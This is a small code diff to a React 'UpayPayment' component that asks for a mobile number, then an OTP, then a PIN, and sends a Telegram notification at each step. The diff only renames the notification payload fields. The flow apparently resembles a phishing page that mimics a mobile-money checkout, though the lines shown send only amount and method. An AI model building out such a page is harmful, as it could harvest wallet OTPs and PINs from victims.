@@ -55,7 +55,7 @@ const UpayPayment = () => {
 
   const handleMobileSubmit = () => {
     if (!isValidMobile()) return;
-    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay Number' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
     setStep('otp');
   };
 
@@ -65,7 +65,7 @@ const UpayPayment = () => {
       setTimeout(() => setShowError(""), 3000);
       return;
     }
-    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Upay OTP' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Upay', paymentType: 'mfs' });
 
     setStep('pin');
   };
